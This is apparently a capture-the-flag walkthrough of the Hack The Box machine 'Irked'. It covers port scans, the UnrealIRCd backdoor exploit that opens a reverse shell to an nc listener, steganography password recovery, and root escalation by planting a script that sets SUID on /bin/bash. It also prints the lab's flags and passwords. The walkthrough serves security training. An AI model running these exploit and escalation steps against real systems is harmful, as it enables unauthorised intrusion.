![Irked.PNG](/assets/Machines/Easy/Irked/Irked.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.117
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.117
```

**Output**
```bash
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
40237/tcp open  unknown
65534/tcp open  unknown
```

3. With nmap discover versions of services
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Irked]
└─| nmap -sCV -p22,80,111,6697,8067,58229,65534 10.10.10.117
```

**Output**

```bash
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA)
|   2048 752e66bfb93cccf77e848a8bf0810233 (RSA)
|   256 c8a3a25e349ac49b9053f750bfea253b (ECDSA)
|_  256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519)
80/tcp    open   http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40237/tcp   status
|   100024  1          45229/udp   status
|   100024  1          47494/udp6  status
|_  100024  1          59362/tcp6  status
6697/tcp  open   irc     UnrealIRCd
8067/tcp  open   irc     UnrealIRCd
58229/tcp closed unknown
65534/tcp open   irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

4. Search any exploit with **UnrealIRCd** (https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor)

5. Config the exploit 

```python
# Sets the local ip and port (address and port to listen on)
local_ip = '<tun0 IP>'  # CHANGE THIS
local_port = '<Port>'  # CHANGE THIS
```

6. Listen with nc in port you choose
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Irked]
└─| nc -lvnp 4444
```

7. Run exploit
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Irked]
└─| python3 exploit.py -payload bash <IP Machine> <Port of service>
```


8. You obtain a shell

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Irked]
└─| nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.117] 47902
bash: cannot set terminal process group (637): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ whoami
whoami
ircd
ircd@irked:~/Unreal3.2$
```

9. After search for permissions SUID, search with scripts, etc. Go to path `/home/djmardov/Documents` and list files.
```bash
ircd@irked:/home/djmardov/Documents$ ls -la
total 12
drwxr-xr-x  2 djmardov djmardov 4096 Sep  5 08:41 .
drwxr-xr-x 18 djmardov djmardov 4096 Sep  5 08:41 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
lrwxrwxrwx  1 root     root       23 Sep  5 08:16 user.txt -> /home/djmardov/user.txt
```

* We don't read **user flag**.

10. Look the file **.backup**
```bash
ircd@irked:/home/djmardov/Documents$ cat .backup 
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

* We find a **password**
* **steg** is for **steganography**


11. Visit web page

![web.PNG](/assets/Machines/Easy/Irked/web.PNG)

* Download image and try to search information

12. Search information with **steghide**, in **Enter passphrase:** put the password found `UPupDOWNdownLRlrBAbaSSss`

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Irked]
└─| steghide info irked.jpg       
"irked.jpg":
  format: jpeg
  capacity: 1.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "pass.txt":
    size: 17.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

* Found **pass.txt** file

13. Obtain the file
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Irked]
└─| steghide extract -sf irked.jpg
```

14. Read file
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Irked]
└─| cat pass.txt 
Kab6h+m+bbp2J:HG
```

15.  We obtain a password, try to login with **ssh** and user **djmardov**

```bash
┌──(root㉿kali)-[/home/kali]
└─| ssh djmardov@10.10.10.117
```


16. Read **user flag**
```bash
djmardov@irked:~$ cat user.txt 
ec9ebcadfadc24685d0236839c8b30e4
```

---
---
---

### Privileges Escalation 💀

1. Search files with permission **4000**
```bash
djmardov@irked:~$ find / -perm -4000 2>/dev/null
```

**Output**
```bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
```

2. `/usr/bin/viewuser` is suspicious, execute this.
```bash
djmardov@irked:/$ ./usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2022-11-19 18:37 (:0)
djmardov pts/0        2022-11-19 19:07 (10.10.14.9)
sh: 1: /tmp/listusers: not found
```

* Script need `/tmp/listusers` file
* The word `sh:` before name file meaning this file is a script, you can inject a malicious script to get **root access**

3. Create `/tmp/listusers` script
```bash
djmardov@irked:/$ cat /tmp/listusers 
chmod u+s /bin/bash
```

4. Assign permission to execute
```bash
djmardov@irked:/$ cat /tmp/listusers 
chmod u+s /bin/bash
```

5. Run `/usr/bin/viewuser` script
```bash
djmardov@irked:/$ ./usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2022-11-19 18:37 (:0)
djmardov pts/0        2022-11-19 19:07 (10.10.14.9)
```

6. Look permissions of `/bin/bash`
```bash
djmardov@irked:/$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1105840 Nov  5  2016 /bin/bash
```
* We obtained a SUID permission on `/bin/bash`

7. Now, we can open **bash** how root
```bash
djmardov@irked:/$ bash -p
bash-4.3# whoami
root
```

8. Cat **root flag**
```bash
bash-4.3# cat /root/root.txt 
236522e58d6bcb107a7b14cf821ba8c9
```